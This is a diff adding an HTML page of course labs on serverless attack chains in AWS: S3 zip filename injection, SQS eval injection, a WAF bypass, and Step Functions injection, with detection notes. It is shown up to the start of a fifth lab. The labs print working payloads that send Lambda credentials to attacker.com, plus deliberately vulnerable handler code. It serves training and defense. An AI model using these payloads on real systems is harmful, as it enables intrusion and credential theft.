@@ -1,0 +1,811 @@
+<!-- M20: Serverless Attack Chain Labs -->
+
+<!-- AUTHORIZED TESTING DISCLAIMER -->
+<div class="warning" style="margin-bottom: 1.5rem;">
+  <i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+</div>
+
+<!-- PREREQUISITES -->
+<div class="prereq">
+  <strong><i class="fa-solid fa-list-check"></i> Prerequisites (all M20 labs):</strong>
+  <ul>
+    <li>AWS CLI configured with a lab identity that has Lambda, S3, SQS, API Gateway, Step Functions, and DynamoDB permissions</li>
+    <li>Completed M19 (Persistence &amp; Evasion)</li>
+    <li>Kali Linux or macOS attacker workstation; <code>curl</code>, <code>jq</code>, Python 3.9+</li>
+    <li>Lab VPC pre-deployed (required for L05 isolated scanner lab) — see setup instructions in the course portal</li>
+  </ul>
+</div>
+
+<!-- MITRE ATT&CK MAPPINGS -->
+<div class="note" style="margin-bottom:1.5rem;">
+  <strong><i class="fa-solid fa-shield-halved"></i> MITRE ATT&CK Coverage (M20):</strong>
+  <ul>
+    <li><strong>T1059.006</strong> — Command and Scripting Interpreter: Python (L01, L02 — command injection via subprocess and eval)</li>
+    <li><strong>T1190</strong> — Exploit Public-Facing Application (L03 — WAF bypass via API Gateway)</li>
+    <li><strong>T1203</strong> — Exploitation for Client Execution (L04 — Step Functions workflow injection)</li>
+    <li><strong>T1046</strong> — Network Service Discovery (L05 — Lambda fan-out scanning)</li>
+  </ul>
+</div>
+
+<div class="lab-walkthrough-content" id="M20-L01-content">
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Achieve remote code execution (RCE) by uploading a malicious file to an S3 bucket that triggers a vulnerable Lambda function via event notifications.</div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Retrieve the S3 bucket's event notification configuration to discover which Lambda functions are triggered on object creation events.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws s3api get-bucket-notification-configuration --bucket target-bucket</div>
+            <div class="terminal-output">{
+    "LambdaFunctionConfigurations": [
+        {
+            "Id": "process-uploads",
+            "LambdaFunctionArn": "arn:aws:lambda:us-east-1:444444444444:function:file-processor",
+            "Events": ["s3:ObjectCreated:*"],
+            "Filter": {
+                "Key": {
+                    "FilterRules": [
+                        {"Name": "prefix", "Value": "uploads/"},
+                        {"Name": "suffix", "Value": ".zip"}
+                    ]
+                }
+            }
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Retrieve the Lambda function source code to confirm the vulnerability. Get the pre-signed download URL, then inspect the handler.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Step 1: Get the function code URL
+$ aws lambda get-function --function-name file-processor \
+  --query 'Code.Location' --output text</div>
+            <div class="terminal-output">https://awslambda-us-east-1-tasks.s3.amazonaws.com/snapshots/444444444444/file-processor-...?X-Amz-...</div>
+            <div class="terminal-cmd"># Step 2: Download and inspect
+$ curl -s "&lt;location-url&gt;" -o function.zip
+$ unzip -p function.zip index.py | head -50</div>
+            <div class="terminal-output">import subprocess, boto3, zipfile, os
+
+def handler(event, context):
+    bucket = event['Records'][0]['s3']['bucket']['name']
+    key = event['Records'][0]['s3']['object']['key']
+
+    s3 = boto3.client('s3')
+    s3.download_file(bucket, key, '/tmp/upload.zip')
+
+    with zipfile.ZipFile('/tmp/upload.zip', 'r') as z:
+        z.extractall('/tmp/extracted/')
+
+    for f in os.listdir('/tmp/extracted/'):
+        # VULNERABLE: filename passed directly to shell
+        subprocess.run(f'file /tmp/extracted/{f}', shell=True)</div>
+          </div>
+        </div>
+        <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Runtime note:</strong> Zip filename remote code execution (RCE) via shell metacharacters is Python-version and runtime-dependent. This technique works reliably on Python 3.9 and 3.10 Lambda runtimes where <code>subprocess.run(..., shell=True)</code> is invoked with unsanitized input. Behavior on Python 3.11+ may differ based on OS subprocess handling. Confirm the target runtime via <code>aws lambda get-function-configuration --function-name file-processor --query RuntimeVersionConfig</code> before crafting your payload.</div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Craft a malicious zip file containing a file whose name includes a shell command injection payload. When extracted and processed, the filename becomes a command.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Create file with command injection in the filename</div>
+            <div class="terminal-output">$ touch 'data; curl https://attacker.com/rce?out=$(whoami)'
+$ zip malicious.zip 'data; curl https://attacker.com/rce?out=$(whoami)'</div>
+            <div class="terminal-cmd"># When the Lambda processes this, it runs:</div>
+            <div class="terminal-output">file /tmp/extracted/data; curl https://attacker.com/rce?out=$(whoami)
+                         ^ first command ends    ^ injected command runs</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Upload the malicious zip to the target bucket's uploads prefix. The S3 event notification automatically triggers the Lambda function.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws s3 cp malicious.zip s3://target-bucket/uploads/malicious.zip</div>
+            <div class="terminal-output">upload: ./malicious.zip to s3://target-bucket/uploads/malicious.zip</div>
+            <div class="terminal-cmd"># S3 event fires -> Lambda invoked -> processes zip -> RCE</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">The Lambda triggers, extracts the zip, and the filename injection payload runs. The attacker receives the callback confirming remote code execution (RCE) with the Lambda's role credentials.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Attacker listener:</div>
+            <div class="terminal-output">GET /rce?out=sbx_user1051
+
+# Escalate -- extract Lambda's AWS credentials:
+GET /rce?creds=ASIAQWERTYUIOP54321:wJalrXUtnFEMI:FwoGZXIvYXdz...
+
+# Lambda role has: S3 full access, DynamoDB read/write, SSM read
+# Full access to all data processed by this function</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Upload malicious file</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">S3 Event</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Lambda triggered</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Processes payload</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">RCE</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> S3-to-Lambda event chains are one of the most common serverless attack surfaces. Always sanitize inputs from S3 event triggers — treat bucket contents as untrusted user input, never pass them to shell commands or dynamic evaluation.</div>
+
+  <!-- DETECTION NOTES -->
+  <div class="note" style="margin-top:1rem;">
+    <strong><i class="fa-solid fa-magnifying-glass"></i> Detection Notes (L01):</strong>
+    <ul>
+      <li>CloudTrail: unexpected <code>s3:PutObject</code> to an uploads prefix from external or unexpected principals</li>
+      <li>Lambda: unusual outbound HTTP connections (visible in VPC Flow Logs; Lambda Insights for non-VPC functions)</li>
+      <li>GuardDuty finding: <code>UnauthorizedAccess:IAMUser/MaliciousIPCaller</code> if the Lambda role is subsequently used from an external IP</li>
+      <li>Fix: use <code>subprocess.run(['file', '/tmp/extracted/' + f])</code> without <code>shell=True</code> — passes args as a list, eliminating shell injection</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M20-L02-content">
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Inject malicious messages into an SQS queue that a Lambda consumer processes unsafely, achieving remote code execution (RCE) via unsafe dynamic code evaluation.</div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Discover SQS queues in the account and identify ones connected to Lambda consumers for data processing.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sqs list-queues</div>
+            <div class="terminal-output">{
+    "QueueUrls": [
+        "https://sqs.us-east-1.amazonaws.com/444444444444/order-processing",
+        "https://sqs.us-east-1.amazonaws.com/444444444444/data-transform",
+        "https://sqs.us-east-1.amazonaws.com/444444444444/notification-queue"
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Examine the queue's resource policy to determine if external or cross-account message sending is permitted.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sqs get-queue-attributes \
+  --queue-url https://sqs.us-east-1.amazonaws.com/444444444444/data-transform \
+  --attribute-names Policy</div>
+            <div class="terminal-output">{
+    "Attributes": {
+        "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"*\"},\"Action\":\"sqs:SendMessage\",\"Resource\":\"arn:aws:sqs:us-east-1:444444444444:data-transform\"}]}"
+    }
+}
+# Principal: * -- ANYONE can send messages to this queue!</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Examine the Lambda consumer code to identify how messages are processed. The function uses dynamic code evaluation on user-controlled input.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat consumer.py  # Retrieved from Lambda function code</div>
+            <div class="terminal-output">import json
+import builtins
+
+def handler(event, context):
+    for record in event['Records']:
+        body = json.loads(record['body'])
+        # VULNERABLE: dynamic code evaluation on user-controlled input
+        result = getattr(builtins, 'eval')(body['expression'])
+        print(f"Result: {result}")
+        return {"statusCode": 200, "body": str(result)}</div>
+          </div>
+        </div>
+        <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Why <code>getattr(builtins, 'eval')</code>, not <code>__builtins__['eval']</code>:</strong> In the Lambda execution environment, <code>__builtins__</code> is a module object, not a dict — so <code>__builtins__['ev'+'al']</code> raises <code>TypeError: 'module' object is not subscriptable</code> at runtime. The correct pattern is <code>import builtins; getattr(builtins, 'eval')(...)</code> or simply <code>eval(...)</code>. Additionally, the <code>'ev'+'al'</code> string concatenation obfuscation is trivially detected by any SAST tool — real obfuscation uses <code>getattr(__import__('builtins'), chr(101)+chr(118)+chr(97)+chr(108))</code>.</div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Inject a malicious message into the queue. The <code>expression</code> field is dynamically evaluated, allowing arbitrary Python code to run inside the Lambda.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sqs send-message \
+  --queue-url https://sqs.us-east-1.amazonaws.com/444444444444/data-transform \
+  --message-body '{"expression":"__import__(\"os\").system(\"id\")"}'</div>
+            <div class="terminal-output">{
+    "MD5OfMessageBody": "a1b2c3d4e5f6...",
+    "MessageId": "msg-12345678-abcd-efgh-ijkl-123456789012"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">The Lambda consumer picks up the message and evaluates the expression — achieving remote code execution (RCE) inside the Lambda. Escalate by exfiltrating the function's AWS credentials for further lateral movement.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># More sophisticated payload -- exfil Lambda credentials:</div>
+            <div class="terminal-output">$ aws sqs send-message \
+  --queue-url https://sqs.us-east-1.amazonaws.com/444444444444/data-transform \
+  --message-body '{"expression":"__import__(\"urllib.request\",fromlist=[\"urlopen\"]).urlopen(\"https://attacker.com/sqs?k=\"+__import__(\"os\").environ.get(\"AWS_ACCESS_KEY_ID\",\"\")+\"&amp;s=\"+__import__(\"os\").environ.get(\"AWS_SECRET_ACCESS_KEY\",\"\")[:20]).read()"}'</div>
+            <div class="terminal-cmd"># Attacker receives:</div>
+            <div class="terminal-output">GET /sqs?k=ASIAQWERTYUIOP99988&s=wJalrXUtnFEMI/K7MD...
+# Lambda role credentials -- map permissions and pivot</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">SQS Queue</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Inject message</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Lambda consumes</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Unsafe dynamic evaluation</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">RCE</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> SQS queues with <code>Principal: *</code> allow anyone to inject messages. Combined with Lambda consumers using dynamic code evaluation or unsafe deserialization, this creates an unauthenticated remote code execution (RCE) path. Always validate and sanitize queue messages, and restrict SQS send permissions.</div>
+
+  <!-- DETECTION NOTES -->
+  <div class="note" style="margin-top:1rem;">
+    <strong><i class="fa-solid fa-magnifying-glass"></i> Detection Notes (L02):</strong>
+    <ul>
+      <li>CloudTrail: <code>sqs:SendMessage</code> from external or anonymous principals is high-signal — queue policies allowing <code>Principal: *</code> should always alert</li>
+      <li>Lambda: SAST scanning of function code for <code>eval(</code>, <code>exec(</code>, <code>compile(</code> called with non-literal arguments</li>
+      <li>Runtime: abnormal Lambda duration or timeout (large payload evaluation) + unexpected outbound connections</li>
+      <li>Fix: never call <code>eval()</code> on queue message content; use a schema-validated allow-list of permitted operations instead</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M20-L03-content">
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Bypass API Gateway WAF input validation and achieve remote code execution (RCE) on the backend Lambda through input injection.</div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Map all API Gateway REST APIs and their resources/methods to identify potential injection points and backend integrations.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws apigateway get-rest-apis</div>
+            <div class="terminal-output">{
+    "items": [
+        {"id": "abc123xyz", "name": "production-api", "endpointConfiguration": {"types": ["REGIONAL"]}},
+        {"id": "def456uvw", "name": "internal-api", "endpointConfiguration": {"types": ["PRIVATE"]}}
+    ]
+}</div>
+            <div class="terminal-cmd">$ aws apigateway get-resources --rest-api-id abc123xyz</div>
+            <div class="terminal-output">{
+    "items": [
+        {"id": "root1", "path": "/"},
+        {"id": "res01", "path": "/process", "resourceMethods": {"POST": {}}},
+        {"id": "res02", "path": "/query", "resourceMethods": {"GET": {}}},
+        {"id": "res03", "path": "/admin", "resourceMethods": {"GET": {}, "POST": {}}}
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Identify the backend integration and check for input validation or request templates that might be injectable. Look for passthrough configurations.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws apigateway get-integration --rest-api-id abc123xyz \
+  --resource-id res01 --http-method POST</div>
+            <div class="terminal-output">{
+    "type": "AWS_PROXY",
+    "uri": "arn:aws:lambda:us-east-1:444444444444:function:data-processor",
+    "passthroughBehavior": "WHEN_NO_MATCH",
+    "contentHandling": "CONVERT_TO_TEXT"
+}
+# AWS_PROXY = full request passthrough to Lambda -- no input mapping
+# Request body goes directly to the function handler</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Craft a payload that bypasses WAF rules in front of the API. Use Unicode escaping to evade string-literal pattern matching in the WAF rule set.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># WAF blocks common injection patterns in JSON bodies
+# Bypass: use Unicode escaping to evade string matching</div>
+            <div class="terminal-output">{
+    "input": "\u0024\u0028id\u0029"
+}
+# WAF sees Unicode escapes -- no match on "$(id)"
+# Lambda JSON parser decodes to: {"input": "$(id)"}</div>
+          </div>
+        </div>
+        <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>WAF v2 accuracy note:</strong> AWS WAF v2 with AWS Managed Rules applies Unicode normalization transformations (URL_DECODE, HTML_ENTITY_DECODE) before pattern matching since 2023. This Unicode bypass is less reliable against properly configured modern WAF v2 deployments. Test against the specific WAF rule configuration in scope before assuming this technique will succeed.</div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Send the crafted payload through the API Gateway endpoint. The WAF passes it through, and the Lambda backend processes the unescaped injection.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ curl -X POST \
+  https://abc123xyz.execute-api.us-east-1.amazonaws.com/prod/process \
+  -H "Content-Type: application/json" \
+  -d '{"input":"\u0024(id)"}'</div>
+            <div class="terminal-output">{
+    "statusCode": 200,
+    "body": "Processed: uid=993(sbx_user1051) gid=990 groups=990"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Verify full remote code execution (RCE) by extracting the Lambda's environment variables containing AWS credentials. Use these to pivot into other AWS services.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ curl -X POST \
+  https://abc123xyz.execute-api.us-east-1.amazonaws.com/prod/process \
+  -H "Content-Type: application/json" \
+  -d '{"input":"\u0024(env | grep AWS | base64)"}'</div>
+            <div class="terminal-output">{
+    "statusCode": 200,
+    "body": "Processed: QVDTX0FDQ0VTU19LRVlfSUQ9QVNJQVFXRVJUWVVJLi4u..."
+}
+
+# Decoded:
+AWS_ACCESS_KEY_ID=ASIAQWERTYUI...
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG...
+AWS_SESSION_TOKEN=FwoGZXIvYXdz...
+AWS_LAMBDA_FUNCTION_NAME=data-processor</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Map API endpoints</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Craft WAF bypass</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Inject payload</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Lambda processes</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">RCE + credential theft</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> API Gateway with <code>AWS_PROXY</code> integration passes the entire request to Lambda without transformation. WAF rules that match on literal strings can be bypassed with Unicode escaping against older WAF configurations. Always validate inputs server-side in the Lambda function — WAF is a defense-in-depth layer, not a substitute for input sanitization.</div>
+
+  <!-- DETECTION NOTES -->
+  <div class="note" style="margin-top:1rem;">
+    <strong><i class="fa-solid fa-magnifying-glass"></i> Detection Notes (L03):</strong>
+    <ul>
+      <li>WAF logs: requests with high Unicode escape density are suspicious — enable WAF logging and alert on rule matches that were sampled but not blocked</li>
+      <li>Lambda: <code>subprocess</code> calls with <code>shell=True</code> processing API Gateway body input are the root cause — fix in code</li>
+      <li>GuardDuty Runtime Monitoring: command execution inside Lambda execution environments generates findings in GuardDuty Runtime Monitoring (preview/GA depending on region)</li>
+      <li>AWS WAF v2 with Core Rule Set (CRS) in BLOCK mode (not COUNT) and text transformations enabled provides the most reliable coverage against these encoding bypasses</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M20-L04-content">
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Manipulate an AWS Step Functions state machine by injecting malicious payloads into task inputs, hijacking workflow logic to achieve remote code execution (RCE).</div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">List all Step Functions state machines in the account and identify those with external input paths (API Gateway triggers, manual starts).</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws stepfunctions list-state-machines</div>
+            <div class="terminal-output">{
+    "stateMachines": [
+        {
+            "stateMachineArn": "arn:aws:states:us-east-1:444444444444:stateMachine:order-workflow",
+            "name": "order-workflow",
+            "type": "STANDARD"
+        },
+        {
+            "stateMachineArn": "arn:aws:states:us-east-1:444444444444:stateMachine:data-pipeline",
+            "name": "data-pipeline",
+            "type": "STANDARD"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Retrieve the state machine definition (ASL) to understand the workflow logic, task inputs, and where user-controlled data flows through.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws stepfunctions describe-state-machine \
+  --state-machine-arn arn:aws:states:us-east-1:444444444444:stateMachine:data-pipeline</div>
+            <div class="terminal-output">{
+    "definition": "{\"StartAt\":\"ValidateInput\",\"States\":{\"ValidateInput\":{\"Type\":\"Pass\",\"Next\":\"ProcessData\"},\"ProcessData\":{\"Type\":\"Task\",\"Resource\":\"arn:aws:lambda:us-east-1:444444444444:function:data-processor\",\"InputPath\":\"$.payload\",\"Next\":\"StoreResults\"},\"StoreResults\":{\"Type\":\"Task\",\"Resource\":\"arn:aws:states:::dynamodb:putItem\",\"Parameters\":{\"TableName\":\"results\",\"Item\":{\"id\":{\"S.$\":\"$.id\"},\"data\":{\"S.$\":\"$.output\"}}},\"End\":true}}}",
+    "roleArn": "arn:aws:iam::444444444444:role/StepFunctionsRole"
+}</div>
+            <div class="terminal-cmd"># Parsed workflow:</div>
+            <div class="terminal-output">ValidateInput (Pass -- no validation!) -> ProcessData (Lambda) -> StoreResults (DynamoDB)
+Input flows: $.payload -> Lambda -> $.output -> DynamoDB
+No input sanitization at any step</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Discover the vulnerable Lambda function source code before crafting the injection payload. Get the code URL and inspect the handler.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Step 1: Get the function code URL
+$ aws lambda get-function --function-name data-processor \
+  --query 'Code.Location' --output text</div>
+            <div class="terminal-output">https://awslambda-us-east-1-tasks.s3.amazonaws.com/snapshots/444444444444/data-processor-...?X-Amz-...</div>
+            <div class="terminal-cmd"># Step 2: Download and inspect
+$ curl -s "&lt;location-url&gt;" -o function.zip
+$ unzip -p function.zip handler.py | head -50</div>
+            <div class="terminal-output"># Lambda code (vulnerable):
+def handler(event, context):
+    import subprocess
+    cmd = f"transform --format {event['format']} --input {event['data']}"
+    result = subprocess.run(cmd, shell=True, capture_output=True)
+    return {"output": result.stdout.decode()}
+
+# event['data'] flows directly into a shell command -- command injection</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Start a new workflow run with a malicious payload that exploits the command injection in the Lambda processor. The <code>ValidateInput</code> state is a <code>Pass</code> type — it performs zero actual validation.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws stepfunctions start-execution \
+  --state-machine-arn arn:aws:states:us-east-1:444444444444:stateMachine:data-pipeline \
+  --input '{
+    "payload": {
+      "format": "json",
+      "data": "file.csv; curl https://attacker.com/sf?env=$(env|base64|tr -d \\n)",
+      "id": "run-001"
+    }
+  }'</div>
+            <div class="terminal-output">{
+    "executionArn": "arn:aws:states:us-east-1:444444444444:execution:data-pipeline:run-a1b2c3d4",
+    "startDate": "2026-04-01T09:00:00Z"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Monitor the run progress and verify the injected command completed successfully. The attacker receives the Lambda's credentials via the callback.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws stepfunctions describe-execution \
+  --execution-arn arn:aws:states:us-east-1:444444444444:execution:data-pipeline:run-a1b2c3d4</div>
+            <div class="terminal-output">{
+    "status": "SUCCEEDED",
+    "startDate": "2026-04-01T09:00:00Z",
+    "stopDate": "2026-04-01T09:00:03Z"
+}</div>
+            <div class="terminal-cmd"># Attacker C2 received:</div>
+            <div class="terminal-output">GET /sf?env=QVDTX0FDQ0VTU19LRVk9QVNJQVhYWC4uLg==
+
+# The StepFunctions role also has DynamoDB write access
+# Attacker can now write arbitrary data to the results table</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Start with payload</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Pass-through validation</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Lambda processes input</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Command injection</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">RCE + data access</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> Step Functions state machines often chain multiple services with trusted data flow. A <code>Pass</code> state named "ValidateInput" gives a false sense of security — it performs zero validation. Always implement actual input validation in Lambda code, not just workflow state names.</div>
+
+  <!-- DETECTION NOTES -->
+  <div class="note" style="margin-top:1rem;">
+    <strong><i class="fa-solid fa-magnifying-glass"></i> Detection Notes (L04):</strong>
+    <ul>
+      <li>CloudTrail: <code>states:StartExecution</code> from unexpected external principals; inspect the execution input for shell metacharacters in string fields</li>
+      <li>Step Functions execution history captures full input/output for each state — review <code>describe-execution</code> output during IR</li>
+      <li>Lambda: same subprocess/shell injection detection as L01 — SAST scanning of all Lambda functions called by state machines</li>
+      <li>Principle of least privilege: the Step Functions IAM role should not have DynamoDB write access if only the Lambda needs it — scope IAM roles per-resource, not per-workflow</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M20-L05-content">
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Understand the Lambda fan-out scanning technique used in the 2024 mass-breach by replicating it against an isolated simulated target fleet within a private lab VPC — with zero traffic leaving the lab AWS account.</div>
+
+  <div class="warning" style="margin: 1rem 0;">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>LEGAL WARNING:</strong> Scanning external internet hosts for exposed <code>.env</code> files constitutes unauthorized computer access under the CFAA and equivalent laws in virtually every jurisdiction, even for "research" purposes. This lab uses isolated simulated targets within a private VPC. NEVER run this technique against real internet hosts. All traffic in this lab stays within your lab AWS account and VPC.
+  </div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
